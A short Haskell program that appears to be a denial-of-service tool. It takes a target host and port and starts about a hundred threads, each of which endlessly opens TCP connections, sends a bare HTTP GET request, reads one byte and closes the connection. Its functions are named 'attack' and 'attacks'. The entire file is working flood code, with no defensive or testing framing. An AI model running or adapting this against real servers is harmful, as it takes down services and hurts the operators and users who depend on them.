{-# LANGUAGE OverloadedStrings #-}
import Network.Socket
import Control.Monad
import qualified Network.Socket.ByteString as B
import qualified Data.ByteString.Char8 as B
import Control.Concurrent
import Foreign.Marshal.Alloc
import GHC.IO.Handle
import System.Environment

main = do
  [host, port] <- getArgs
  (addrinfo:_) <- getAddrInfo (Just (defaultHints { addrFamily = AF_INET })) 
                              (Just host) 
                              (Just port)
  let sa = addrAddress addrinfo
  print addrinfo
  forM_ [0..98] (\_ ->
                    forkIO (attacks sa))
  putStrLn ""
  attacks sa

attacks sa = forever $ attack sa

attack sa =
  do sock <- socket AF_INET Stream 0
     connect sock sa
     B.send sock prepmsg
     B.recv sock 1
     close sock

prepmsg = "GET / HTTP/1.1\r\n\r\n"
